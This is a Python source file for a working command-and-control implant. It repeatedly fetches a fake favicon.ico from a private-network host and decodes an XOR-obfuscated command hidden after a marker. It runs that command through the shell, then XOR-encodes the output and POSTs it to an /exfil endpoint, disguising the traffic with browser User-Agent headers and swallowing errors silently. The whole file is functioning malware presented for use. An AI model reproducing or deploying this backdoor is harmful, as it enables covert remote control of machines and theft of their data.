import time
import urllib.request
import subprocess

PAYLOAD_MARKER = b"__COVERT_DATA__"
XOR_KEY = 0x5A

# Keep this pointed to your host IP address
C2_URL = "http://192.168.1.3:8080/favicon.ico"
EXFIL_URL = "http://192.168.1.3:8080/exfil"

LAST_EXECUTED_COMMAND = ""

def poll_c2():
    global LAST_EXECUTED_COMMAND
    try:
        req = urllib.request.Request(C2_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as response:
            file_bytes = response.read()
            
        marker_index = file_bytes.find(PAYLOAD_MARKER)
        if marker_index != -1:
            payload_start = marker_index + len(PAYLOAD_MARKER)
            encrypted_bytes = file_bytes[payload_start:]
            command = "".join([chr(b ^ XOR_KEY) for b in encrypted_bytes]).strip()
            
            if command != LAST_EXECUTED_COMMAND:
                print(f"[+] Executing and capturing: {command}")
                LAST_EXECUTED_COMMAND = command
                
                # 1. Execute the system command and capture the text output string
                try:
                    # Runs the command through the shell and grabs stdout/stderr together
                    cmd_output = subprocess.check_output(
                        command, 
                        shell=True, 
                        stderr=subprocess.STDOUT,
                        stdin=subprocess.DEVNULL
                    )
                except subprocess.CalledProcessError as e:
                    # If a command fails (like a typo in 'dirr'), catch the error text output
                    cmd_output = e.output
                
                # 2. Obfuscate the output data using our same XOR key
                if not cmd_output:
                    cmd_output = b"[+] Command executed successfully but returned no output."
                    
                encrypted_output = bytes([b ^ XOR_KEY for b in cmd_output])
                
                # 3. Ship the data package back upstream to the server via POST
                exfil_req = urllib.request.Request(
                    EXFIL_URL, 
                    data=encrypted_output, 
                    headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/octet-stream'}
                )
                with urllib.request.urlopen(exfil_req, timeout=5) as exfil_resp:
                    exfil_resp.read() # Flush response handle
                    
            else:
                pass
        else:
            if LAST_EXECUTED_COMMAND != "":
                LAST_EXECUTED_COMMAND = ""
            
    except Exception as e:
        pass

if __name__ == "__main__":
    print("[*] Two-Way Agent active. Awaiting instructions...")
    while True:
        poll_c2()
        time.sleep(5)